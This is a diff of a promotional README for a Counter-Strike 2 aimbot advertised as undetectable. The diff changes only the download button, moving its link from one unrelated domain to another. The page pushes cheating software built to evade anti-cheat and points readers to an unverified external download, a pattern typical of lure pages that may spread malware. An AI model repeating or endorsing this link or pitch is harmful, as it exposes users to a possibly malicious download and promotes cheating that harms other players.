@@ -8,7 +8,7 @@ Master every match in **Counter-Strike 2** with this advanced **Aimbot**—featu
 - 🚫 **Undetectable & Secure**  
 - 🖥️ **Clean UI with Easy Configs**
 
-[![Download CS2 Aim](https://img.shields.io/badge/Download-CS2%20Aim-blueviolet)](https://resser.tech)
+[![Download CS2 Aim](https://img.shields.io/badge/Download-CS2%20Aim-blueviolet)](https://2xethevent.com)
 
 Choose how you play: silent & clean or fast & furious. 🏆
 
